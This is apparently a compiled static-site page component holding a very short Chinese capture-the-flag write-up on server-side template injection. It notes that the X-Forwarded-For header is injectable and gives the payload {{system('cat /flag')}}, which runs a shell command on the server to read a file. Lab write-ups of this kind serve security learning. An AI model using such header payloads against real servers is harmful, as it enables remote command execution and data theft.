@@ -1,0 +1,3 @@
+import{_ as e,o as s,c as a,e as n}from"./app-b1c518ef.js";const r={},c=n(`<p>#SSTI</p><p>页面中 API 写着 get IP 与 get XFF<br> x-Forward-For 存在注入</p><div class="language-url line-numbers-mode" data-ext="url"><pre class="language-url"><code><span class="token scheme">X-Forwarded-For<span class="token scheme-delimiter">:</span></span>
+<span class="token scheme">X-Forwarded-For<span class="token scheme-delimiter">:</span></span> {{system(&#39;cat /flag&#39;)}}
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,3),t=[c];function l(o,d){return s(),a("div",null,t)}const m=e(r,[["render",l],["__file","Web11.html.vue"]]);export{m as default};
